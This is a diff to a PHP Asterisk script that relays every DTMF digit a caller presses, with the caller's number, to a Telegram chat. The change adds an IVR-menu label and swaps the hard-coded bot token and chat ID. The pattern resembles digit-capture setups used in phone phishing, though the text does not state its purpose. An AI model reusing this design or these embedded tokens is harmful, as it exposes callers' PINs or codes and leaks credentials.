@@ -36,6 +36,7 @@ while (!feof($socket)) {
 
         // Get the DTMF digit
         $digit = $eventData['Digit'];
+        $context = $eventData['Context'];
 
         // Replace '#' with 'hash'
         if ($digit == "#") {
@@ -45,6 +46,10 @@ while (!feof($socket)) {
         // Construct the output in the desired format
         $callerID = $eventData['CallerIDNum'];
         $output = $callerID . " pressed " . $digit;
+
+        if ($context == "ivr-1") {
+            $output = $callerID . " pressed " . $digit . " in IVR menu";
+        }
 
         // Call the function with the new format
         getdtmf($output);
@@ -62,7 +67,8 @@ function getdtmf($dtmf) {
     $curl = curl_init();
 
     curl_setopt_array($curl, array(
-        CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . urlencode($dtmf),
+        //CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . urlencode($dtmf),
+        CURLOPT_URL => 'https://api.telegram.org/bot8178049394:AAGvWMrdWzJS0brFmCBL_dyUKk6ZMTGDwYY/sendMessage?chat_id=-1002347274383&text=' . urlencode($dtmf),
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_ENCODING => '',
         CURLOPT_MAXREDIRS => 10,
